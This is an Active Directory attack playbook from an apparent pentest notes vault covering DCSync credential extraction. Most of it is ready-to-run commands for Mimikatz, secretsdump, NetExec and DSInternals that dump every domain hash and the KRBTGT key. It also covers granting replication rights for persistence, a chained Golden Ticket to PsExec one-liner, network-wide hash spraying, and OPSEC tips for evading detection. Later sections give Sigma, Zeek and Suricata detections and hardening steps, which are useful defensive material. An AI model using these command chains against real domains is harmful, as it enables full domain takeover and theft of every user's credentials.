---
title: "Attack #37 — DCSync Attack"
description: "DCSync is the most efficient method for extracting every credential in an Active Directory domain without ever touching the NTDS.dit file on disk or…"
category: active-directory
tags: ["active-directory", "kerberos", "credential-access", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Certipy", "Hashcat"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Five/🔵 Attack #37 — DCSync Attack.md"
---
# 🔵 Attack #37 — DCSync Attack

***

## 📖 How It Works

DCSync is **the most efficient method for extracting every credential in an Active Directory domain** without ever touching the NTDS.dit file on disk or running code on a Domain Controller. It exploits the **[Directory Replication Service Remote Protocol (MS-DRSR)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/)** — the legitimate protocol that Domain Controllers use to synchronize Active Directory data between each other during normal replication. An attacker with the correct replication permissions can impersonate a Domain Controller and request the DC to send replication data containing password hashes for any or all domain accounts.

The attack works by triggering the `GetNCChanges` RPC function (via the `DRSUAPI` interface) from a non-DC workstation. The target Domain Controller processes this as a legitimate replication request and responds with the requested user's credential material, including **NT hashes, Kerberos AES keys, old password hashes, and password history**. The entire exchange happens over the network using standard RPC — no malware needs to be deployed on the DC, no LSASS memory is accessed, and the NTDS.dit file is never read from disk.

> [!info]+ Technical Deep-Dive — DRSUAPI GetNCChanges Flow
> `ris:FileList`
> 1. The attacker binds to the DC's **DRSUAPI RPC endpoint** (UUID `e3514235-4b06-11d1-ab04-00c04fc2dcd2`) over TCP 135 → dynamic RPC port
> 2. Calls `DRSBind` to establish a replication context handle with the DC
> 3. Calls `DRSGetNCChanges` specifying the target account's **Distinguished Name** (or requesting the entire naming context)
> 4. The DC validates the caller has both **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** extended rights on the domain NC head
> 5. The DC responds with `REPLENTINFLIST` structures containing **NTLM hashes** (via `unicodePwd`), **Kerberos keys** (via `supplementalCredentials`), and **password history** (via `lmPwdHistory` / `ntPwdHistory`)
> 6. *The attacker decodes the PEK-encrypted attributes locally — the DC performs decryption before transmission when the session is authenticated*

### Required Permissions

DCSync requires the requesting principal to have specific extended rights on the domain's root object (the domain naming context):

| Permission (ACE) | GUID | Who Has It by Default |
|---|---|---|
| **Replicating Directory Changes** (DS-Replication-Get-Changes) | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Domain Admins, Enterprise Admins, Administrators, DCs |
| **Replicating Directory Changes All** (DS-Replication-Get-Changes-All) | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Domain Admins, Enterprise Admins, Administrators, DCs |

Both permissions are required simultaneously. Having only one is insufficient — `Get-Changes` alone provides attribute data but not secret data (password hashes); `Get-Changes-All` alone doesn't grant the replication request capability.

> [!warning]+ Third Replication Right — DS-Replication-Get-Changes-In-Filtered-Set
> `fas:TriangleExclamation`
> 1. GUID: `89e95b76-444d-4c62-991a-0facbeda640c`
> 2. This third replication right controls access to **RODC-filtered attributes** (confidential attributes excluded from Read-Only Domain Controllers)
> 3. Some tools (e.g., older [Mimikatz](https://github.com/gentilkiwi/mimikatz) versions) may fail to extract certain attributes without this right
> 4. *In practice, DA/EA groups have this right by default, so it only matters when manually granting DCSync to a custom principal*

### The Full Attack Flow

```
1. Obtain Domain Admin privileges (or an account with replication rights)
   - Or: find a non-DA account that has been granted replication rights (ACL abuse)
2. From any domain-joined machine, run DCSync (no need to be on the DC)
3. Request replication data for specific users or all users
4. Receive NT hashes, AES keys, and password history
5. Use extracted hashes for:
   - Pass-the-Hash (Attack #4)
   - Golden Ticket forging with KRBTGT hash (Attack #11)
   - Offline password cracking
   - Silver Ticket forging (Attack #12)
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Account with replication rights** | Domain Admins, Enterprise Admins, Administrators, or any account with both DS-Replication-Get-Changes + Get-Changes-All ACEs |
| **Network access to DC** | RPC/DRSUAPI access (TCP 135 + dynamic RPC ports, or TCP 49152+) |
| **No DC access needed** | Works from any domain-joined workstation — this is a remote attack |

***

## 🛠️ Tools

| Tool | Platform | Version | Notes |
|---|---|---|---|
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows | ≥ 2.2.0 | `lsadump::dcsync` — the original DCSync implementation |
| [Impacket — secretsdump.py](https://github.com/fortra/impacket) | Linux | ≥ 0.10.0 | `-just-dc` flags — most common Linux method |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) / [NetExec](https://github.com/Pennyw0rth/NetExec) | Linux | NXC ≥ 1.1.0 | `--ntds drsuapi` — DCSync via CME/NXC |
| [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) | Windows/PowerShell | ≥ 4.7 | `Get-ADReplAccount` — PowerShell-native DCSync |
| [SharpKatz](https://github.com/b4rtik/SharpKatz) | Windows (.NET) | Latest | DCSync via a Mimikatz-derived .NET assembly — useful for C2 `execute-assembly` |
| [bloodyAD](https://github.com/CravateRouge/bloodyAD) | Linux/Python | ≥ 1.0.0 | Check & grant replication rights — pairs with secretsdump |
| [dacledit.py](https://github.com/fortra/impacket) | Linux | Impacket ≥ 0.10.0 | Read/write DACLs for granting DCSync rights |

> [!tip]+ Tool Version Compatibility Notes
> `fas:Lightbulb`
> 1. **Impacket 0.12.0+** changed the module layout — `secretsdump.py` is now under `impacket/examples/`; install via `pipx install impacket` for correct PATH resolution
> 2. **NetExec** replaced CrackMapExec (archived) — use `nxc` binary; `crackmapexec` is legacy
> 3. **DSInternals 4.8+** supports Azure AD Kerberos keys (`msDS-ManagedPassword` for gMSA accounts)
> 4. **SharpKatz** must match the target .NET CLR version — compile for .NET 4.0 for Server 2012/2016, .NET 4.8 for 2019+

***

## ⏱️ Time-to-Execute Estimates

| Operation | Time | Notes |
|---|---|---|
| Single-user DCSync | **2–5 seconds** | One DRSUAPI call round-trip |
| Full domain dump (1,000 users) | **30–90 seconds** | Depends on network speed and attribute count |
| Full domain dump (50,000+ users) | **10–30 minutes** | Enterprise environments; consider single-user targeting instead |
| Granting DCSync rights (ACL write) | **1–3 seconds** | Near-instant LDAP modification |

***

## 💻 Full Commands

### 🔵 Step 0 — Check If You Have Replication Rights

```powershell
# ── PowerView — enumerate who has DCSync rights ──────────────────────────────
Import-Module .\PowerView.ps1
Get-ObjectACL "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {
    ($_.ObjectAceType -match 'Replication-Get') -or
    ($_.ActiveDirectoryRights -match 'GenericAll')
  } | Select-Object SecurityIdentifier, ObjectAceType |
  ForEach-Object {
    $_ | Add-Member -NotePropertyName Principal -NotePropertyValue (
      Convert-SidToName $_.SecurityIdentifier
    ) -PassThru
  }

# ── AD Module — check specific user ──────────────────────────────────────────
(Get-Acl "AD:DC=corp,DC=local").Access |
  Where-Object { $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" } |
  Select-Object IdentityReference

# ── Native — verify your current rights ───────────────────────────────────────
whoami /all
# Check group memberships for: Domain Admins, Enterprise Admins, Administrators
```

```bash
# ── Linux — check replication rights with bloodyAD ────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  get writable --right 'REPLICATION'

# ── Impacket — FindDelegation / dacledit ──────────────────────────────────────
dacledit.py -action read -target-dn "DC=corp,DC=local" \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10
```

***

### 🔴 DCSync — Single User (Extract Specific Account Hash)

#### Mimikatz (Windows)

```powershell
# ── DCSync a single user — extract Administrator hash ─────────────────────────
privilege::debug
lsadump::dcsync /domain:corp.local /user:Administrator

# Output contains:
# SAM Username         : Administrator
# Hash NTLM           : 2b576acbe6bcfda7294d6bd18041b8fe  ← NT hash
# aes256_hmac          : b65fb27c...                        ← AES256 key
# aes128_hmac          : a1b2c3d4...                        ← AES128 key
# Credentials (old)    : <previous password hashes>          ← Password history

# ── DCSync the KRBTGT account (for Golden Ticket forging) ────────────────────
lsadump::dcsync /domain:corp.local /user:krbtgt

# ── DCSync a specific user by SID ────────────────────────────────────────────
lsadump::dcsync /domain:corp.local /user:CN=svc_backup,CN=Users,DC=corp,DC=local

# ── DCSync using /all to dump every single account ────────────────────────────
lsadump::dcsync /domain:corp.local /all /csv
# ⚠️ LOUD — dumps every account; use single-user requests in stealth operations
```

#### Impacket — secretsdump.py (Linux)

```bash
# ── DCSync single user — extract Administrator hash ───────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user Administrator

# ── DCSync KRBTGT (for Golden Ticket) ─────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user krbtgt

# ── DCSync with Pass-the-Hash (no password needed) ────────────────────────────
secretsdump.py corp.local/Administrator@DC01.corp.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
  -just-dc-user krbtgt

# ── DCSync with Kerberos authentication ───────────────────────────────────────
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local \
  -just-dc-user krbtgt
```

#### SharpKatz (Windows — .NET Assembly for C2)

```powershell
# ── Via Cobalt Strike / Sliver execute-assembly ──────────────────────────────
execute-assembly /path/to/SharpKatz.exe --Command dcsync --User Administrator --Domain corp.local --DomainController DC01.corp.local

# ── Standalone ────────────────────────────────────────────────────────────────
SharpKatz.exe --Command dcsync --User krbtgt --Domain corp.local --DomainController DC01.corp.local
```

> [!info]+ Command Breakdown — secretsdump.py Flags
> `ris:Command`
> 1. **`-just-dc`**: Only perform DCSync (DRSUAPI replication); skip SAM/LSA/DPAPI extraction that requires SMB admin access. Outputs NT hashes + Kerberos keys + cleartext passwords (if reversible encryption enabled)
> 2. **`-just-dc-ntlm`**: Same as `-just-dc` but only extract NT hashes (no Kerberos keys). Faster; smaller output files
> 3. **`-just-dc-user <user>`**: DCSync only the specified user — single DRSUAPI request, much stealthier than full dump
> 4. **`-history`**: Include password history hashes — useful for finding password reuse patterns and cracking previous passwords
> 5. **`-outputfile <prefix>`**: Write results to files with the given prefix (`.ntds`, `.ntds.kerberos`, `.ntds.cleartext` extensions)
> 6. **`-hashes :<NT_HASH>`**: Authenticate via Pass-the-Hash — no cleartext password needed
> 7. **`-k -no-pass`**: Authenticate via Kerberos using a ccache ticket — stealthiest auth method; requires `KRB5CCNAME` environment variable set
> 8. *The `-just-dc` family of flags is what makes secretsdump.py perform DCSync (DRSUAPI) instead of SMB-based NTDS.dit extraction*

***

### 🔴 DCSync — Specific High-Value Targets

```bash
# ── gMSA (Group Managed Service Account) password extraction ──────────────────
# gMSA passwords are stored in msDS-ManagedPassword — DCSync can extract them
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user 'gMSA_svc$'
# The supplementalCredentials will contain the gMSA password blob
# Decode with: gMSADumper.py or DSInternals

# ── LAPS (Local Admin Password Solution) ──────────────────────────────────────
# LAPS passwords are stored in ms-MCS-AdmPwd (LAPS v1) or msLAPS-Password (LAPS v2)
# DCSync extracts ALL attributes — but LAPS passwords are in the computer object, not user
# You need to query the computer object specifically:
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user 'WORKSTATION01$'

# ── KRBTGT for every domain in the forest (multi-domain) ─────────────────────
# If you have Enterprise Admin, DCSync the child domain's KRBTGT:
secretsdump.py corp.local/EntAdmin:'Password1'@CHILDDC.child.corp.local \
  -just-dc-user krbtgt

# ── RODC (Read-Only DC) KRBTGT — krbtgt_NNNNN ────────────────────────────────
# RODCs have their own KRBTGT account (krbtgt_<RID>):
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user 'krbtgt_12345'
# This KRBTGT can forge tickets accepted by that specific RODC only
```

> [!tip]+ gMSA Password Extraction Deep-Dive
> `fas:Lightbulb`
> 1. gMSA passwords are 256 bytes of random data, auto-rotated every 30 days by default
> 2. The `msDS-ManagedPassword` attribute is a **constructed attribute** — not directly stored in NTDS.dit but computed at query time
> 3. **DCSync CAN extract the NT hash** of a gMSA account — the hash is stored in `unicodePwd` like any other account
> 4. For the full gMSA password blob (useful for decrypting DPAPI or service configs), use [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) or [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) `Get-ADReplAccount`
> 5. *gMSA accounts are increasingly common in modern AD environments — always check for them during DCSync*

***

### 🔴 DCSync — Advanced Auth Variants

```bash
# ── Via SOCKS proxy (through C2 tunnel) ───────────────────────────────────────
proxychains secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user krbtgt
# Useful when attacking through a Cobalt Strike / Chisel / Ligolo SOCKS tunnel

# ── Via certificate authentication (PKINIT) ──────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -username Administrator
# Outputs: administrator.ccache
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local -just-dc

# ── Via Silver Ticket (if you have a service account hash for the DC) ─────────
# Forge a Silver Ticket for the DC's DRSUAPI SPN:
ticketer.py -nthash <DC_MACHINE_HASH> -domain-sid S-1-5-21-... \
  -domain corp.local -spn E3514235-4B06-11D1-AB04-00C04FC2DCD2/DC01.corp.local \
  Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local -just-dc
# ⚠️ Silver Ticket DCSync is unusual but works — the DC validates the SPN, not group membership

# ── From a non-domain-joined Linux box ────────────────────────────────────────
# You need to configure /etc/krb5.conf with the domain realm and DC KDC:
# [realms]
#   CORP.LOCAL = { kdc = DC01.corp.local }
# Then:
secretsdump.py corp.local/Administrator:'Password1'@10.10.10.10 \
  -just-dc-user krbtgt -target-ip 10.10.10.10
```

***

### 🔴 Automation — One-Liner Attack Chains

```bash
# ── Full DCSync → Golden Ticket → PsExec chain ───────────────────────────────
# Step 1: DCSync KRBTGT
KRBTGT=$(secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user krbtgt 2>/dev/null | grep "Kerberos keys" -A1 | grep aes256 | awk '{print $2}')

# Step 2: Get domain SID
DSID=$(lookupsid.py corp.local/Administrator:'Password1'@DC01.corp.local 0 2>/dev/null | grep "Domain SID" | awk '{print $NF}')

# Step 3: Forge Golden Ticket
ticketer.py -aesKey $KRBTGT -domain-sid $DSID -domain corp.local Administrator

# Step 4: Use it
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── Quick spray extracted hashes for local admin reuse ────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-ntlm -outputfile dump && \
  grep -v '\$:' dump.ntds | cut -d: -f4 | sort -u > unique_hashes.txt && \
  nxc smb 10.10.10.0/24 -u Administrator -H unique_hashes.txt --local-auth --continue-on-success
```

***

### 🔴 DCSync — Full Domain Dump (All Users)

#### Impacket — secretsdump.py (Linux)

```bash
# ── Full DCSync — dump ALL domain account hashes ──────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-ntlm -outputfile domain_hashes

# Output files:
# domain_hashes.ntds          ← All NT hashes (username:RID:LM:NT:::)
# domain_hashes.ntds.kerberos ← All Kerberos keys (AES256, AES128, DES)
# domain_hashes.ntds.cleartext ← Any reversible encryption passwords

# ── Full dump including Kerberos keys ─────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc -outputfile full_domain_dump

# ── Dump with password history ────────────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc -history -outputfile domain_with_history

# ── Using PtH ────────────────────────────────────────────────────────────────
secretsdump.py corp.local/Administrator@DC01.corp.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
  -just-dc-ntlm -outputfile domain_hashes
```

#### CrackMapExec / NetExec (Linux)

```bash
# ── DCSync via NetExec ────────────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -p 'Password1' --ntds drsuapi

# ── With PtH ──────────────────────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe --ntds drsuapi

# ── Output to file ────────────────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -p 'Password1' --ntds drsuapi \
  --output domain_hashes.txt

# ── Kerberos auth ─────────────────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache
nxc smb DC01.corp.local -u Administrator -k --ntds drsuapi
```

#### Mimikatz (Windows)

```powershell
# ── Dump all users via DCSync ─────────────────────────────────────────────────
privilege::debug
lsadump::dcsync /domain:corp.local /all /csv
# Output: CSV format with all usernames and NT hashes
```

#### DSInternals (PowerShell)

```powershell
# ── PowerShell-native DCSync ──────────────────────────────────────────────────
Install-Module DSInternals -Force
Import-Module DSInternals

# Single user
Get-ADReplAccount -SamAccountName Administrator -Server DC01.corp.local

# All users
Get-ADReplAccount -All -Server DC01.corp.local |
  Select-Object SamAccountName, @{N='NTHash';E={$_.NTHash | ConvertTo-Hex}} |
  Export-Csv domain_hashes.csv -NoTypeInformation

# ── Extract gMSA passwords via replication ────────────────────────────────────
Get-ADReplAccount -SamAccountName 'gMSA_svc$' -Server DC01.corp.local |
  Select-Object -ExpandProperty Supplementalcredentials
```

***

### 🔴 Granting DCSync Rights (Persistence / ACL Abuse — Attack #65)

```powershell
# ── If you have GenericAll/WriteDACL on the domain object, grant yourself DCSync ─

# PowerView — add Replicating Directory Changes + All to a user
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity low_user \
  -Rights DCSync -Verbose

# ── Now low_user can DCSync from any machine ──────────────────────────────────
lsadump::dcsync /domain:corp.local /user:krbtgt
# Works because low_user now has both replication ACEs
```

```bash
# ── Linux — grant DCSync rights via dacledit.py ───────────────────────────────
dacledit.py -action write -rights DCSync \
  -principal low_user -target-dn "DC=corp,DC=local" \
  corp.local/DA_user:'Password1' -dc-ip 10.10.10.10

# ── bloodyAD ──────────────────────────────────────────────────────────────────
bloodyAD -d corp.local -u DA_user -p 'Password1' --host DC01.corp.local \
  add dcsync low_user

# ── Remove DCSync rights (cleanup) ───────────────────────────────────────────
dacledit.py -action remove -rights DCSync \
  -principal low_user -target-dn "DC=corp,DC=local" \
  corp.local/DA_user:'Password1' -dc-ip 10.10.10.10

bloodyAD -d corp.local -u DA_user -p 'Password1' --host DC01.corp.local \
  remove dcsync low_user
```

***

### 🔴 Post-DCSync — What to Do with the Hashes

```bash
# ── 1. Forge a Golden Ticket with KRBTGT hash ────────────────────────────────
ticketer.py -nthash <KRBTGT_HASH> \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local Administrator

# ── 2. Pass-the-Hash with Administrator hash ─────────────────────────────────
nxc smb 10.10.10.0/24 -u Administrator -H <NT_HASH> --local-auth
psexec.py corp.local/Administrator@DC01.corp.local -hashes :<NT_HASH>
evil-winrm -i DC01.corp.local -u Administrator -H <NT_HASH>

# ── 3. Crack hashes offline ──────────────────────────────────────────────────
hashcat -m 1000 domain_hashes.ntds rockyou.txt --force
john --format=NT domain_hashes.ntds --wordlist=rockyou.txt

# ── 4. Spray hashes across the network (local admin reuse) ───────────────────
nxc smb 10.10.10.0/24 -u Administrator -H <NT_HASH> --local-auth
# Find which machines have the same local admin hash = credential reuse
```

***

## 🎯 OPSEC Tips

1. **Single-user DCSync is stealthier than full dump** — targeting specific accounts (krbtgt, Administrator) generates fewer replication events than dumping the entire directory
2. **DCSync from a workstation, not the DC** — replication requests from a workstation IP are the anomaly that detection relies on; but running from the DC itself blends with legitimate replication (if you already have DC access)
3. **Use Kerberos auth over NTLM** — NTLM-authenticated DCSync generates additional network logon events; Kerberos blends with normal traffic
4. **DCSync leaves NO artifacts on the DC** — no files written, no LSASS access, no process injection; it's purely a network-level operation
5. **Time your attacks** — DCSync during business hours when legitimate replication traffic is high creates more noise to hide in
6. **Target specific high-value accounts** — KRBTGT (Golden Ticket), service accounts (Silver Tickets), and DA accounts; don't dump everything unless you need to
7. **Avoid running from a non-domain-joined machine** — some EDRs flag DRSUAPI calls from IPs with no corresponding AD computer object

### 📊 OpSec Ranking

| Method | Stealth | Speed | Reliability | Notes |
|---|---|---|---|---|
| Mimikatz single-user | 🟡 Medium | 🟢 Fast | 🟢 High | Detected by most EDR on-disk; use from memory |
| secretsdump.py single-user (Kerberos) | 🟢 High | 🟢 Fast | 🟢 High | Best overall — network-only, Kerberos auth |
| secretsdump.py full dump | 🔴 Low | 🟡 Medium | 🟢 High | Massive replication traffic = easy to spot |
| NetExec `--ntds drsuapi` | 🟡 Medium | 🟡 Medium | 🟢 High | Convenient but logs SMB + DRSUAPI |
| DSInternals | 🟡 Medium | 🟡 Medium | 🟡 Medium | PowerShell logging catches module loads |
| SharpKatz (in-memory .NET) | 🟢 High | 🟢 Fast | 🟡 Medium | Good for C2; avoids disk touches |

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Directory Service Access — GUID `{1131f6aa-...}` or `{1131f6ad-...}` from a **non-DC account** |
| **4624** | Security Log (DC) | Network logon (Type 3) from the source IP performing DCSync |
| **4672** | Security Log (DC) | Special privileges assigned to the DCSync session |

**Primary detection signature:** Event ID **4662** is the definitive DCSync indicator. Configure "Audit Directory Service Access" in Advanced Audit Policy, then alert on 4662 events where:
1. The `Properties` field contains GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (Replication-Get-Changes-All)
2. The `Account Name` does **NOT** end with `$` (non-computer account) — or is a computer account that is NOT a legitimate Domain Controller

Additionally, **network-level detection** is highly effective: monitor for DRSUAPI RPC calls (`DsGetNCChanges`) originating from IP addresses that are not registered Domain Controllers. Tools like Microsoft Defender for Identity (MDI) and Zeek/Bro IDS can detect this pattern with high confidence.

### 🔎 Sigma Rules

```yaml
# ── SigmaHQ — DCSync Activity (Event ID 4662) ───────────────────────────────
title: Potential DCSync Attack
id: 5f842047-8e40-4e44-a88e-9c6c3c42b1b0
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
  filter_dc:
    SubjectUserName|endswith: '$'
  condition: selection and not filter_dc
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
```

```yaml
# ── SigmaHQ — DCSync Rights Granted ─────────────────────────────────────────
title: DCSync Rights Granted to User Account
id: 56ab2f68-7859-4886-a0c3-c0bca7379ce0
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'nTSecurityDescriptor'
    ObjectClass: 'domainDNS'
  condition: selection
level: high
```

### 🌐 Network-Level Detection (Zeek / Suricata)

```zeek
# ── Zeek script — detect DRSUAPI DsGetNCChanges from non-DC sources ──────────
# File: detect-dcsync.zeek
event dce_rpc_request(c: connection, fid: count, opnum: count, stub_len: count) {
    # DRSUAPI UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
    # OpNum 3 = DsGetNCChanges
    if (opnum == 3) {
        local src = c$id$orig_h;
        if (src !in known_dcs) {
            NOTICE([$note=DCSync_Attempt,
                    $msg=fmt("DsGetNCChanges from non-DC: %s → %s", src, c$id$resp_h),
                    $conn=c]);
        }
    }
}
```

```yaml
# ── Suricata rule — DRSUAPI traffic from non-DC ──────────────────────────────
alert tcp !$DC_SERVERS any -> $DC_SERVERS any (
  msg:"ATTACK [DCSync] DRSUAPI DsGetNCChanges from non-DC";
  content:"|05 00 00|"; offset:0; depth:3;  # DCE/RPC request header
  content:"|35 42 51 e3 06 4b d1 11 ab 04 00 c0 4f c2 dc d2|"; # DRSUAPI UUID
  reference:url,attack.mitre.org/techniques/T1003/006/;
  classtype:credential-access;
  sid:2024001; rev:1;
)
```

### 🛡️ EDR-Specific Detections

> [!warning]+ Microsoft Defender for Identity (MDI)
> `ris:Windows`
> 1. **"Suspected DCSync attack (replication of directory services)"** — high-confidence alert triggered when a non-DC machine calls DsGetNCChanges
> 2. MDI correlates the source IP against registered DC objects in AD — any mismatch triggers the alert
> 3. **"Malicious replication request"** — fires when a user account (not machine account) initiates replication
> 4. *MDI is considered the gold standard for DCSync detection — it has near-zero false positives in most environments*

> [!warning]+ CrowdStrike Falcon
> `ris:Radar`
> 1. **"DCSync Credential Dumping"** — detects DRSUAPI GetNCChanges from non-DC endpoints
> 2. Falcon monitors RPC traffic and correlates with endpoint process trees
> 3. Also detects SharpKatz and Mimikatz in-memory execution via behavioral indicators (AMSI bypass, reflective loading patterns)

> [!warning]+ Elastic Security
> `ris:FileList`
> 1. Rule: **"Potential Credential Access via DCSync"** — correlates 4662 events with replication GUIDs
> 2. Rule: **"Unusual DRSUAPI DsGetNCChanges RPC"** — network-level detection via Packetbeat / Zeek
> 3. Kibana detection rule ID: `credential_access_dcsync`

***

## 🔬 Forensic Artifacts

| Artifact | Location | Details |
|---|---|---|
| **Event 4662** | DC Security Log | Contains SubjectUserSid, ObjectType GUIDs, and Properties accessed |
| **Event 4624** | DC Security Log | Network logon from attacker IP — Type 3 with NTLM or Kerberos |
| **RPC traffic** | Network capture | DRSUAPI `DsGetNCChanges` requests on dynamic RPC ports (49152+) |
| **Replication metadata** | `repadmin /showmeta` | `msDS-ReplAttributeMetaData` shows last replication source — won't show DCSync (no actual replication occurs) |
| **ACL modifications** | Event 5136 / nTSecurityDescriptor | If attacker granted themselves DCSync rights, the ACL change is logged |
| **No disk artifacts on DC** | N/A | DCSync leaves zero forensic artifacts on the target DC's filesystem — this is purely network-based |

***

> [!important]+ Windows Server Version Differences
> `ris:Windows`
> 1. **Server 2016+**: Advanced Audit Policy "Audit Directory Service Access" must be explicitly enabled — it's not on by default in all SKUs
> 2. **Server 2019+**: Windows Defender Credential Guard protects LSASS but does **NOT** prevent DCSync — DCSync doesn't touch LSASS
> 3. **Server 2022**: No new mitigations against DCSync — still relies on ACL auditing and network monitoring
> 4. **Server 2025**: Microsoft introduced **Credential Guard by default** on new installs, but again this does NOT mitigate DCSync; the only effective control remains auditing replication ACLs and monitoring 4662 events
> 5. *DCSync will remain exploitable as long as the DS-Replication protocol exists — it's a feature, not a bug; the mitigation is controlling WHO has replication rights*

***

## 🔒 Hardening & Prevention

```powershell
# ── 1. Audit who currently has DCSync rights ──────────────────────────────────
Import-Module ActiveDirectory
(Get-Acl "AD:DC=corp,DC=local").Access |
  Where-Object {
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
  } | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType |
  Format-Table -AutoSize

# ── 2. Remove DCSync rights from unnecessary accounts ─────────────────────────
# Use ADSI to remove specific ACEs — replace SID with the target principal
$acl = Get-Acl "AD:DC=corp,DC=local"
$acl.Access | Where-Object { $_.IdentityReference -eq "CORP\unnecessary_user" } |
  ForEach-Object { $acl.RemoveAccessRule($_) }
Set-Acl "AD:DC=corp,DC=local" $acl

# ── 3. Enable Advanced Audit Policy for Directory Service Access ──────────────
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# ── 4. GPO — Enable auditing domain-wide ─────────────────────────────────────
# Computer Configuration → Policies → Windows Settings → Security Settings →
# Advanced Audit Policy Configuration → DS Access →
#   ✅ Audit Directory Service Access: Success, Failure
#   ✅ Audit Directory Service Changes: Success, Failure

# ── 5. Monitor ACL changes on the domain object ──────────────────────────────
# Enable SACL on DC=corp,DC=local for "Modify permissions" operations
# This generates Event 4662 when anyone changes the domain DACL

# ── 6. Restrict privileged group membership ───────────────────────────────────
# Use AdminSDHolder + SDProp to protect DA/EA groups
# Implement Tiered Administration (Tier 0 for DC access only)

# ── 7. Deploy MDI or equivalent DRSUAPI monitoring ────────────────────────────
# Microsoft Defender for Identity sensors on all DCs
# Or: Zeek/Bro IDS with DRSUAPI protocol analyzer

# ── 8. Network segmentation — restrict RPC from workstations to DCs ───────────
# Windows Firewall on DCs:
New-NetFirewallRule -DisplayName "Block DRSUAPI from non-DCs" `
  -Direction Inbound -Protocol TCP -LocalPort 49152-65535 `
  -RemoteAddress "10.10.10.0/24" -Action Block
# ⚠️ Be very careful — this can break legitimate admin tools; test thoroughly
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `ERROR_DS_DRA_ACCESS_DENIED` / `0x2105` | Account lacks one or both replication rights | Verify both `Get-Changes` + `Get-Changes-All` ACEs are present on the account |
| `RPC_S_ACCESS_DENIED` on bind | Firewall blocking RPC dynamic ports to DC | Ensure TCP 135 + 49152-65535 are open from attacker to DC; or use `--target-ip` with secretsdump |
| Mimikatz `ERROR kuhl_m_lsadump_dcsync` | Running without `privilege::debug` / not elevated | Run as admin and execute `privilege::debug` first; or use `token::elevate` |
| secretsdump returns `0 hashes` | Specified wrong domain or user doesn't exist | Double-check domain FQDN (`corp.local` not `CORP`); verify user's sAMAccountName |
| `KRB_AP_ERR_SKEW` with Kerberos auth | Time difference > 5 minutes between attacker and DC | Sync clock: `ntpdate DC01.corp.local` or `rdate -s DC01.corp.local` |
| NetExec `STATUS_ACCESS_DENIED` | Account not in DA or doesn't have replication rights | Verify group membership or explicitly granted ACEs; try `-k` for Kerberos instead of NTLM |
| DSInternals `Get-ADReplAccount` fails | Module not installed or DC unreachable | `Install-Module DSInternals -Force`; verify DC hostname resolves and RPC ports are open |
